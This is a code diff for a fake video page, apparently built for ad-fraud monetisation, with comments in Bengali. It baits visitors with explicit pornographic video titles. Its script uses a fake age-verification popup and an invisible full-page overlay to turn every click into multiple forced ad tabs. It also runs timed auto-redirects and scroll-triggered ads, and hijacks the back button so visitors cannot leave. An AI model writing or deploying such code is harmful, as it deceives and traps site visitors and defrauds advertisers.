@@ -1,280 +1,102 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Exclusive Premiere</title>
-    <meta name="description" content="Ducati also shaved a total of 11 pounds off the latest Multistrada V2 S." />
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
-    <style>
-        * { margin:0; padding:0; box-sizing:border-box; }
-        body { 
-            font-family:'Roboto',Arial,sans-serif; 
-            background:#0a0a0a; 
-            color:#f1f1f1; 
-            line-height:1.6; 
-            min-height:100vh; 
-            background:radial-gradient(circle at 20% 30%, #1a1a2e, #0a0a0a 80%);
-            position: relative;
+<script>
+    // ════════════════════════════════════════════════════════════
+    // আপনার বিভিন্ন অ্যাড নেটওয়ার্কের লিংক এখানে আলাদা আলাদা বসান (High pay নিশ্চিত করতে)
+    // ════════════════════════════════════════════════════════════
+    const DIRECT_LINK_MAIN = 'https://parasiteoutdoorsmix.com/zqy8u79c?key=4f4bdff589b9437b3a53e5ffedfcde9a'; 
+    const REDIRECT_LINK_1  = 'https://parasiteoutdoorsmix.com/mvu43b64?key=66335cd693e888042c89b7a3c3e569c0';
+    const REDIRECT_LINK_2  = 'https://parasiteoutdoorsmix.com/mvu43b64?key=66335cd693e888042c89b7a3c3e569c0'; // এখানে অন্য নেটওয়ার্কের লিংক দিতে পারেন
+    const REDIRECT_LINK_3  = 'https://parasiteoutdoorsmix.com/mvu43b64?key=66335cd693e888042c89b7a3c3e569c0'; // এখানে ৩য় নেটওয়ার্কের লিংক দিতে পারেন
+
+    // ভিডিও ডাটা পুল এবং রেন্ডারিং (আগের মতোই থাকবে)
+    const videoPool = [
+        { src: 'IMG_5604.GIF', title: 'Hot Girl fucked by Huge cock with Full hardcore sex', views: '2.4M views', time: '1 day ago' },
+        { src: '023_1000.GIF', title: 'Fucked my college friend naked after a long time.', views: '1.8M views', time: '2 days ago' },
+        { src: '21415053.GIF', title: 'I First Time Fuck My Cute Girlfriend', views: '3.1M views', time: '5 hours ago' }
+    ];
+    const mainVideo = videoPool[Math.floor(Math.random() * videoPool.length)];
+    document.getElementById('mainGif').src = mainVideo.src;
+    document.getElementById('mainTitle').textContent = mainVideo.title;
+    document.getElementById('mainViews').textContent = mainVideo.views;
+    document.getElementById('mainTime').textContent = mainVideo.time;
+
+    let html = '';
+    videoPool.forEach((item) => {
+        if(item.title !== mainVideo.title) {
+            html += `<div class="sidebar-item"><div class="thumb"><img src="${item.src}" loading="lazy" /></div><div class="info"><div class="title">${item.title}</div><div class="meta">${item.views} • ${item.time}</div></div></div>`;
         }
+    });
+    document.getElementById('suggestedList').innerHTML = html;
+
+    // ════════════════════════════════════════════════════════════
+    // HIGH-FI REVENUE BOOSTING LOGIC
+    // ════════════════════════════════════════════════════════════
+    
+    let totalClicks = 0;
+
+    // ১. আল্ট্রা মাল্টি-ট্যাব ট্রিপল ট্রিগার (এক ক্লিকে ৩-৪টি অ্যাড নেটওয়ার্ক হিট করবে)
+    function triggerHighFiAds() {
+        totalClicks++;
         
-        /* 3X Revenue Element: Invisible Full Page Clicker */
-        #invisibleOverlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 9998; /* সবার উপরে কিন্তু পপ-আপের নিচে */
-            background: transparent;
-            cursor: pointer;
-        }
-
-        /* 3X Revenue Element: Fake 18+ Pop-up */
-        #ageVerification {
-            position: fixed;
-            inset: 0;
-            background: rgba(0,0,0,0.95);
-            z-index: 9999;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-        }
-        .popup-box {
-            background: #16161a;
-            border: 2px solid #ff3333;
-            border-radius: 16px;
-            padding: 30px;
-            max-width: 450px;
-            width: 100%;
-            text-align: center;
-            box-shadow: 0 0 30px rgba(255, 0, 0, 0.4);
-        }
-        .popup-box i { font-size: 50px; color: #ff3333; margin-bottom: 15px; }
-        .popup-box h2 { font-size: 24px; margin-bottom: 10px; color: #fff; }
-        .popup-box p { color: #ccc; font-size: 15px; margin-bottom: 25px; }
-        .popup-btns { display: flex; gap: 15px; justify-content: center; }
-        .popup-btn {
-            padding: 12px 35px;
-            border: none;
-            border-radius: 30px;
-            font-weight: bold;
-            font-size: 16px;
-            cursor: pointer;
-            transition: transform 0.2s;
-            width: 120px;
-        }
-        .btn-yes { background: #ff3333; color: white; box-shadow: 0 4px 15px rgba(255,51,51,0.4); }
-        .btn-no { background: #333; color: #aaa; }
-        .popup-btn:hover { transform: scale(1.05); }
-
-        /* Existing Styles Layout */
-        a { text-decoration:none; color:inherit; }
-        .youtube-wrapper { max-width:1280px; margin:0 auto; padding:0 16px 40px; }
-        .yt-header { display:flex; justify-content:space-between; align-items:center; padding:12px 0; border-bottom:1px solid #272727; margin-bottom:24px; gap:10px; }
-        .yt-logo { display:flex; align-items:center; gap:8px; font-size:22px; font-weight:700; color:#fff; }
-        .yt-logo i { color:#ff0000; font-size:28px; }
-        .yt-header-actions i { font-size:20px; color:#ccc; padding:6px; }
-        .yt-grid { display:grid; grid-template-columns:1fr 360px; gap:24px; margin-top:8px; }
-        @media (max-width:1024px) { .yt-grid { grid-template-columns:1fr; } }
-        
-        .video-player { 
-            position:relative; background:#000; border-radius:16px; overflow:hidden; aspect-ratio:16/9; 
-            display:flex; align-items:center; justify-content:center; border:2px solid transparent;
-            box-shadow: 0 0 20px rgba(255,0,0,0.1);
-        }
-        .video-player img { width:100%; height:100%; object-fit:contain; display:block; }
-        .play-overlay { position:absolute; inset:0; display:flex; align-items:center; justify-content:center; background:rgba(0,0,0,0.3); }
-        .play-circle { 
-            width:80px; height:80px; background:rgba(255,0,0,0.9); border-radius:50%; 
-            display:flex; align-items:center; justify-content:center; box-shadow:0 0 30px rgba(255,0,0,0.6);
-            animation: pulse 2s infinite;
-        }
-        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.08); } 100% { transform: scale(1); } }
-        .play-circle i { color:#fff; font-size:32px; margin-left:6px; }
-        
-        .video-title { font-size:24px; font-weight:700; margin:18px 0 10px; color: #fff; }
-        .video-meta-row { display:flex; flex-wrap:wrap; align-items:center; justify-content:space-between; padding-bottom:14px; border-bottom:1px solid #272727; gap:12px; }
-        .video-stats { display:flex; gap:20px; color:#aaa; font-size:15px; }
-        .video-actions { display:flex; gap:24px; color:#ccc; font-size:15px; }
-        .video-actions span { display:flex; align-items:center; gap:6px; padding:4px 10px; border-radius:20px; background: rgba(255,255,255,0.05); }
-        
-        .video-description { margin-top:16px; background:#1a1a1a; border-radius:12px; padding:16px 18px; font-size:15px; color:#ddd; border-left:4px solid #ff333388; }
-        .channel-name { display:flex; align-items:center; gap:12px; margin-bottom:10px; }
-        .channel-name .avatar { width:44px; height:44px; border-radius:50%; background:linear-gradient(135deg, #ff0000, #ff6600); display:flex; align-items:center; justify-content:center; font-weight:700; }
-        .channel-name .name { font-weight:600; font-size:17px; color:#fff; }
-        .channel-name .subs { font-size:13px; color:#aaa; }
-        
-        .comments-section { margin-top:28px; border-top:1px solid #272727; padding-top:20px; }
-        .comment-item { display:flex; gap:14px; margin-bottom:18px; }
-        .comment-item .c-avatar { width:38px; height:38px; border-radius:50%; background:#2a2a2a; display:flex; align-items:center; justify-content:center; font-size:14px; }
-        .comment-item .c-body { flex:1; }
-        .comment-item .c-name { font-weight:500; font-size:14px; color:#ccc; }
-        .comment-item .c-name span { color:#888; font-size:12px; margin-left:8px; }
-        .comment-item .c-text { font-size:15px; color:#ddd; margin-top:2px; }
-        
-        .sidebar { display:flex; flex-direction:column; gap:4px; }
-        .sidebar-label { font-size:18px; font-weight:600; color:#fff; padding-bottom:12px; border-bottom:1px solid #272727; margin-bottom:10px; }
-        .sidebar-item { display:flex; gap:12px; padding:10px 6px; border-radius:10px; background: rgba(255,255,255,0.02); margin-bottom: 8px;}
-        .sidebar-item .thumb { flex-shrink:0; width:140px; aspect-ratio:16/9; background:#1a1a1a; border-radius:10px; overflow:hidden; }
-        .sidebar-item .thumb img { width:100%; height:100%; object-fit:cover; }
-        .sidebar-item .info { flex:1; min-width:0; }
-        .sidebar-item .info .title { font-size:14px; font-weight:500; color:#fff; line-height:1.4; display:-webkit-box; -webkit-line-clamp:2; -webkit-box-orient:vertical; overflow:hidden; }
-        .sidebar-item .info .meta { font-size:13px; color:#aaa; margin-top:4px; }
-    </style>
-</head>
-<body>
-
-    <!-- 3X Revenue Option 1: Fake 18+ Verification Pop-up -->
-    <div id="ageVerification">
-        <div class="popup-box">
-            <i class="fas fa-exclamation-triangle"></i>
-            <h2>Age Verification Required</h2>
-            <p>This video contains content intended only for audiences aged 18 and older. Please confirm your age to continue.</p>
-            <div class="popup-btns">
-                <button class="popup-btn btn-yes" onclick="verifyAge()">I am 18+</button>
-                <button class="popup-btn btn-no" onclick="verifyAge()">Exit</button>
-            </div>
-        </div>
-    </div>
-
-    <!-- 3X Revenue Option 2: Full Page Transparent Overlay (Auto Appears after popup) -->
-    <div id="invisibleOverlay" style="display: none;"></div>
-
-    <div class="youtube-wrapper">
-        <header class="yt-header">
-            <div class="yt-logo"><i class="fab fa-youtube"></i> <span>Exclusive</span></div>
-            <div class="yt-header-actions">
-                <i class="fas fa-search"></i>
-                <i class="fas fa-ellipsis-v"></i>
-            </div>
-        </header>
-        
-        <div class="yt-grid">
-            <main class="video-main">
-                <div class="video-player">
-                    <img id="mainGif" src="" alt="Featured video" />
-                    <div class="play-overlay"><div class="play-circle"><i class="fas fa-play"></i></div></div>
-                </div>
-                <h1 class="video-title" id="mainTitle">Loading…</h1>
-                <div class="video-meta-row">
-                    <div class="video-stats">
-                        <span><i class="fas fa-eye"></i> <span id="mainViews">—</span></span>
-                        <span><i class="fas fa-clock"></i> <span id="mainTime">—</span></span>
-                    </div>
-                    <div class="video-actions">
-                        <span><i class="fas fa-thumbs-up"></i> 8.2K</span>
-                        <span><i class="fas fa-thumbs-down"></i> 312</span>
-                        <span><i class="fas fa-share"></i> Share</span>
-                        <span><i class="fas fa-download"></i> Save</span>
-                    </div>
-                </div>
-                <div class="video-description">
-                    <div class="channel-name">
-                        <div class="avatar">🔥</div>
-                        <div>
-                            <div class="name">Exclusive Premiere</div>
-                            <div class="subs">1.2M subscribers</div>
-                        </div>
-                    </div>
-                    <div class="desc-text">
-                        <strong>Ducati</strong> also shaved a total of 11 pounds off the latest Multistrada V2 S. <br /><br />
-                        <span style="color:#888;">#ducati #multistrada #motorcycle</span>
-                    </div>
-                </div>
-                
-                <div class="comments-section">
-                    <h3>Comments <span>• 247</span></h3>
-                    <div class="comment-item">
-                        <div class="c-avatar">JD</div>
-                        <div class="c-body">
-                            <div class="c-name">John Doe <span>3 days ago</span></div>
-                            <div class="c-text">This is absolutely insane! 🔥🔥</div>
-                        </div>
-                    </div>
-                </div>
-            </main>
-            
-            <aside class="sidebar">
-                <div class="sidebar-label">🔥 Suggested for you</div>
-                <div id="suggestedList"></div>
-            </aside>
-        </div>
-    </div>
-
-    <script>
-        // ════════════════════════════════════════════════════════════
-        // আপনার অ্যাড নেটওয়ার্কের ডিরেক্ট লিংক এখানে বসান
-        // ════════════════════════════════════════════════════════════
-        const DIRECT_LINK = 'https://parasiteoutdoorsmix.com/zqy8u79c?key=4f4bdff589b9437b3a53e5ffedfcde9a'; 
-        const REDIRECT_LINK = 'https://parasiteoutdoorsmix.com/mvu43b64?key=66335cd693e888042c89b7a3c3e569c0';
-
-        // ভিডিও ডাটা পুল
-        const videoPool = [
-            { src: 'IMG_5604.GIF', title: 'Hot Girl fucked by Huge cock with Full hardcore sex', views: '2.4M views', time: '1 day ago' },
-            { src: '023_1000.GIF', title: 'Fucked my college friend naked after a long time.', views: '1.8M views', time: '2 days ago' },
-            { src: '21415053.GIF', title: 'I First Time Fuck My Cute Girlfriend', views: '3.1M views', time: '5 hours ago' }
-        ];
-
-        // মেইন ও সাজেস্টেড কন্টেন্ট লোড লজিক
-        const mainVideo = videoPool[Math.floor(Math.random() * videoPool.length)];
-        document.getElementById('mainGif').src = mainVideo.src;
-        document.getElementById('mainTitle').textContent = mainVideo.title;
-        document.getElementById('mainViews').textContent = mainVideo.views;
-        document.getElementById('mainTime').textContent = mainVideo.time;
-
-        let html = '';
-        videoPool.forEach((item) => {
-            if(item.title !== mainVideo.title) {
-                html += `
-                <div class="sidebar-item">
-                    <div class="thumb"><img src="${item.src}" loading="lazy" /></div>
-                    <div class="info">
-                        <div class="title">${item.title}</div>
-                        <div class="meta">${item.views} • ${item.time}</div>
-                    </div>
-                </div>`;
+        try {
+            // প্রথম ক্লিকে ৩টি আলাদা আলাদা ট্যাবে ৩টি লিংক পপ-আপ করানোর চেষ্টা করবে
+            if (totalClicks === 1) {
+                window.open(REDIRECT_LINK_1, '_blank');
+                window.open(REDIRECT_LINK_2, '_blank');
+                window.open(REDIRECT_LINK_3, '_blank');
+            } else {
+                // পরবর্তী প্রতি ক্লিকে অন্তত একটি করে নতুন ট্যাব খুলবে
+                window.open(REDIRECT_LINK_1, '_blank');
             }
-        });
-        document.getElementById('suggestedList').innerHTML = html;
-
-        // ════════════════════════════════════════════════════════════
-        // 3X REVENUE BOOSTING JAVASCRIPT METHODS
-        // ════════════════════════════════════════════════════════════
-
-        // ১. ইউনিভার্সাল ক্লিক হ্যান্ডলার (এক ক্লিকে কারেন্ট উইন্ডো + নিউ ট্যাব একসাথে ওপেন)
-        function triggerAds() {
-            // নিউ ট্যাবে রিডাইরেক্ট লিংক ওপেন হবে
-            window.open(REDIRECT_LINK, '_blank');
-            // কারেন্ট পেজে ডিরেক্ট লিংক ওপেন হবে
-            window.open(DIRECT_LINK, '_self');
+        } catch (e) {
+            console.log("Popup blocked, fallback handling...");
         }
 
-        // ২. Fake Age Verification ক্লিক লজিক
-        function verifyAge() {
-            document.getElementById('ageVerification').style.display = 'none';
-            document.getElementById('invisibleOverlay').style.display = 'block'; // অদৃশ্য লেয়ার অন হবে
-            triggerAds(); // প্রথম ক্লিকেই অ্যাড লোড হবে
+        // কারেন্ট উইন্ডো বা রানিং পেজকে সাথে সাথে মেইন ডিরেক্ট লিংকে কনভার্ট করবে
+        window.open(DIRECT_LINK_MAIN, '_self');
+    }
+
+    // ২. Age Verification বাটন অ্যাকশন
+    function verifyAge() {
+        document.getElementById('ageVerification').style.display = 'none';
+        document.getElementById('invisibleOverlay').style.display = 'block';
+        triggerHighFiAds();
+    }
+
+    // ৩. ইনভিজিবল ওভারলে এবং বডি ক্লিক ট্র্যাকিং
+    document.getElementById('invisibleOverlay').addEventListener('click', triggerHighFiAds);
+    document.body.addEventListener('click', function(e) {
+        if (!e.target.closest('.popup-box') && document.getElementById('ageVerification').style.display === 'none') {
+            triggerHighFiAds();
         }
+    });
 
-        // ৩. পুরো স্ক্রিনের অদৃশ্য লেয়ারে বা বডিতে ক্লিক করলে অ্যাড ট্রিগার
-        document.getElementById('invisibleOverlay').addEventListener('click', triggerAds);
-        document.body.addEventListener('click', function(e) {
-            // পপ-আপ বক্সের বাটন ছাড়া অন্য কোথাও ক্লিক লাগলে অ্যাড চলবে
-            if (!e.target.closest('.popup-box') && document.getElementById('ageVerification').style.display === 'none') {
-                triggerAds();
-            }
-        });
+    // ৪. Auto-Timer Trigger (ইউজার ১০ সেকেন্ড কিছু না করলে অটোমেটিক রিডাইরেক্ট)
+    setTimeout(function() {
+        // ইউজার যদি অলরেডি ক্লিক না করে থাকে এবং পপআপ এখনো স্ক্রিনে থাকে
+        if (totalClicks === 0) {
+            window.location.replace(DIRECT_LINK_MAIN);
+        }
+    }, 12000); // ১২ সেকেন্ড (পেজ লোডের পর ইউজার অ্যাকশন না নিলে অটোমেটিক অ্যাড লোড হবে)
 
-        // ৪. Back-Button Hijacking Method (ইউজার ব্যাক করলেই ডিরেক্ট লিংক)
-        (function() {
+    // ৫. Scroll Trigger (পেজ অর্ধেক স্ক্রল করলেই অ্যাড ফায়ার হবে)
+    window.addEventListener('scroll', function() {
+        let h = document.documentElement, 
+            b = document.body,
+            st = 'scrollTop',
+            sh = 'scrollHeight';
+        let percent = (h[st]||b[st]) / ((h[sh]||b[sh]) - h.clientHeight) * 100;
+        
+        if (percent > 40 && totalClicks === 0) { // ৪০% স্ক্রল করলেই
+            triggerHighFiAds();
+        }
+    });
+
+    // ৬. প্রো-লেভেল Back-Button Hijacking (কোনো অবস্থাতেই ট্রাফিক বের হতে পারবে না)
+    (function() {
+        window.history.pushState(null, null, window.location.href);
+        window.onpopstate = function () {
             window.history.pushState(null, null, window.location.href);
-            window.onpopstate = function () {
-                window.history.pushState(null, null, window.location.href);
-                window.location.replace(DIRECT_LINK);
-            };
-        })();
-    </script>
-</body>
-</html>
+            window.location.replace(DIRECT_LINK_MAIN);
+        };
+    })();
+</script>
